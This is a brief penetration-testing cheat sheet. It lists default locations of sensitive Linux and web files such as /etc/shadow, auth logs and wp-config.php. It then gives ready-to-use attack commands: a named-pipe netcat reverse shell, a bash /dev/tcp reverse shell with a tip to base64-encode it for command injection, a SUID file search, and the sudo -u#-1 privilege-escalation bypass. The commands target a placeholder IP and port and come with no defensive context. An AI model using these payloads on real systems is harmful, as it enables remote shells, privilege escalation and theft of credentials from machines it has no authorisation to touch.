## Important files (Default Location)
```
/etc/passwd
/etc/group
/etc/shadow
/var/www/html/
/var/www/
/tmp/
/home/
/var/log/nginx/access.log
/var/log/apache/access.log
/var/log/auth.log
/etc/apache2/sites-available/000-default.conf
/etc/samba/smb.conf
/var/www/html/wordpress/wp-config.php
```

### PrivEsc
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP_ADDR] [PORT] >/tmp/f
sudo -l   # /etc/sudoers
find / -perm -4000 2>/dev/null    # file with suid
sudo -u#-1 /bin/bash
```

### Reverse Shell
```
echo "bash -i >& /dev/tcp/[IP_ADDR]/[PORT] 0>&1" |bash    # base64 encode the echo cmd; use for os command injection (api)
```

### Not So Important But May Be Useful (Default Location)
```
/proc/cpuinfo
```
